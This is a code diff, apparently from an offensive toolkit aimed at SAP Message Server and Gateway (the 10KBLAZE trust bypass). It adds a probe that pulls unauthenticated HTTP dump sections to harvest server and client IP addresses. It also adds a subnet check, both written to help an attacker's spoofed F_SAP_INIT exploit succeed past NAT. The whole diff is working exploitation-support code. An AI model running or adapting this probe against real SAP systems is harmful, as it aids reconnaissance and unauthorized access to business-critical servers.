@@ -37,6 +37,28 @@ from typing import Optional
 
 DEFAULT_MS_HTTP_BASE = 8100
 
+
+# Dump sections that EMPIRICALLY carry per-connection records on at
+# least some kernel releases.  On NW 7.5x+ / 7.9x the MS compiles the
+# connection tables out of the public dump surface and all three
+# return just the banner (``MS_DUMP_CON`` / ``MS_DUMP_ALL_CLIENTS``
+# / ``MS_DUMP_DOMAIN_CONN`` with no body rows).  We still probe them
+# because older kernels do emit rows that include client IP + port,
+# which is exactly what the NAT-aware probe needs.
+_NAT_PROBE_SECTIONS = (
+    (2, "MS_DUMP_CON"),            # per-connection records
+    (4, "MS_DUMP_ALL_CLIENTS"),    # extended client table
+    (7, "MS_DUMP_DOMAIN_CONN"),    # inter-domain connections
+)
+
+
+# IPv4 regex — captures all dotted-quad occurrences in a dump body.
+# Deliberately permissive on the leading octet to pick up 10/172/192
+# ranges equally; the caller filters out the server's own address
+# + loopbacks.
+_IPV4_RE = re.compile(
+    r"\b(?:\d{1,3})\.(?:\d{1,3})\.(?:\d{1,3})\.(?:\d{1,3})\b")
+
 # Dump sections we know are useful.  Kept extensible — adding another
 # section is a one-line change to `SECTIONS` below.
 SECTIONS = {
@@ -338,3 +360,131 @@ def probe_ms_info(host: str, inst_nr: Optional[int] = None,
         "identity":   identity,
         "error":      "" if success else (first_error or "no data disclosed"),
     }
+
+
+# ---------------------------------------------------------------------------
+# NAT-aware probe (10KBLAZE / betrusted companion)
+# ---------------------------------------------------------------------------
+
+def probe_ms_apparent_ip(host: str,
+                          inst_nr: Optional[int] = None,
+                          timeout: float = 3.0) -> dict:
+    """Best-effort NAT-detection probe against the MS HTTP dump endpoint.
+
+    Issues at least four GETs over separate TCP sockets:
+
+    1. ``?3=1`` MS_DUMP_PARAMS — mines the MS's own ``server addr``
+       field (the IP the MS kernel binds to its listen socket).
+       Returned as ``server_addr`` even on kernels where sections 2/4/7
+       are empty; the betrusted chain uses it as a sanity check against
+       the operator-supplied target IP.
+    2. ``?2=1`` MS_DUMP_CON             -- per-connection records.
+    3. ``?4=1`` MS_DUMP_ALL_CLIENTS     -- extended client table.
+    4. ``?7=1`` MS_DUMP_DOMAIN_CONN     -- inter-domain connections.
+
+    Sections 2/4/7 are empirically empty on NW 7.5x+ / 7.9x (the kernel
+    strips the connection tables from the public dump), but the probe
+    still runs them because older 7.2x / 7.4x kernels do emit rows that
+    include client IP + port — which, when a dotted-quad in the row
+    doesn't match the MS's own ``server_addr`` + isn't a loopback,
+    is the SNAT'd apparent source IP the GW will see on an F_SAP_INIT
+    from the attacker.
+
+    Returns::
+
+      {
+        "ok":              bool,  # at least one dump section responded
+        "server_addr":     str,   # MS's own listen IP (from PARAMS)
+        "candidate_ips":   list,  # dotted-quads from sections 2/4/7
+                                  # that aren't server_addr / loopback
+        "sections_tried":  list,  # [(section_id, status, body_len), ...]
+        "best_apparent_ip": str,  # single-candidate heuristic result
+        "error":           str,
+      }
+    """
+    http_port = DEFAULT_MS_HTTP_BASE + (inst_nr if inst_nr is not None else 1)
+
+    def _fetch(section: int) -> tuple:
+        status, body_bytes, err = _http_get(
+            host, http_port,
+            f"/msgserver/text/dump?{section}=1", timeout)
+        if status != 200 or not body_bytes:
+            return ("", err or f"http_{status}")
+        body = body_bytes.decode("latin-1", errors="replace")
+        if not _DUMP_BANNER_RE.search(body):
+            return ("", "no_dump_banner")
+        return (body, "")
+
+    # 1. PARAMS — mine server_addr.
+    server_addr = ""
+    sections_tried = []
+    params_body, params_err = _fetch(3)
+    sections_tried.append(
+        (3, ("ok" if params_body else (params_err or "no-body")),
+         len(params_body or "")))
+    if params_body:
+        for line in params_body.splitlines():
+            m = _KV_LINE_RE.match(line)
+            if m and m.group(1).strip().lower() == "server addr":
+                server_addr = m.group(2).strip()
+                break
+
+    # 2-4. Connection tables.  Scan each body for dotted-quads that
+    # aren't the server_addr or loopback.
+    candidate_ips: list = []
+    seen: set = set()
+    for sec_id, _label in _NAT_PROBE_SECTIONS:
+        body, err = _fetch(sec_id)
+        sections_tried.append(
+            (sec_id, ("ok" if body else (err or "no-body")),
+             len(body or "")))
+        if not body:
+            continue
+        for m in _IPV4_RE.finditer(body):
+            ip = m.group()
+            if ip in seen:
+                continue
+            seen.add(ip)
+            # Filter: skip the MS's own addr, loopback, and the
+            # banner / header noise (`127.0.0.1` and `0.0.0.0`
+            # appear in headers of some kernels).
+            if ip in ("", server_addr, "127.0.0.1", "0.0.0.0", "255.255.255.255"):
+                continue
+            if ip.startswith("127."):
+                continue
+            candidate_ips.append(ip)
+
+    best = candidate_ips[0] if len(candidate_ips) == 1 else ""
+    return {
+        "ok":               bool(server_addr) or bool(candidate_ips),
+        "server_addr":      server_addr,
+        "candidate_ips":    candidate_ips,
+        "sections_tried":   sections_tried,
+        "best_apparent_ip": best,
+        "error": "" if server_addr or candidate_ips
+                   else "MS HTTP dump returned no usable data (ACL enforced or empty tables)",
+    }
+
+
+def subnet_mismatch(attacker_ip: str, target_ip: str) -> bool:
+    """True when attacker and target are on different /24 subnets.
+
+    Cheap heuristic for the NAT-warning diagnostic: if the first three
+    octets don't match, there is almost certainly a router between us
+    and the target.  That router MAY SNAT (common on VPN exits, Docker
+    bridges, consumer home routers in bridge-mode) — if it does, the
+    GW's F_SAP_INIT trust check compares against the SNAT'd source IP
+    rather than the attacker IP we injected, and the exploit fails
+    even on a vulnerable kernel.
+
+    Returns False on parse errors (be lenient — the warning fires only
+    when we're sure the subnets differ).
+    """
+    try:
+        a_parts = attacker_ip.strip().split(".")
+        t_parts = target_ip.strip().split(".")
+        if len(a_parts) != 4 or len(t_parts) != 4:
+            return False
+        return a_parts[:3] != t_parts[:3]
+    except Exception:
+        return False
